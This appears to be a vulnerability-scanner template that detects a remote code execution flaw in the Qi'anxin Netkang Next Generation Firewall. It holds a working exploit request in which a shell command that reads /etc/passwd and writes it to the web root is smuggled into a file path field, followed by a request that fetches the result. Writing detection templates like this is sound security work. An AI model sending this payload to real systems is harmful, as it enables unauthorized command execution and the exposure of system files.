id: qi-anxin-netkang-next-generation-firewall-rce
info:
  author: pikpikcu
  name: Qi'anxin Netkang Next Generation Firewall RCE
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: critical
  tags: rce
requests:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /directdata/direct/router HTTP/1.1

    Host: {{Hostname}}


    {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat
    /etc/passwd >/var/www/html/poc.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}

    '
  - 'GET /poc.txt HTTP/1.1

    Host: {{Hostname}}

    '
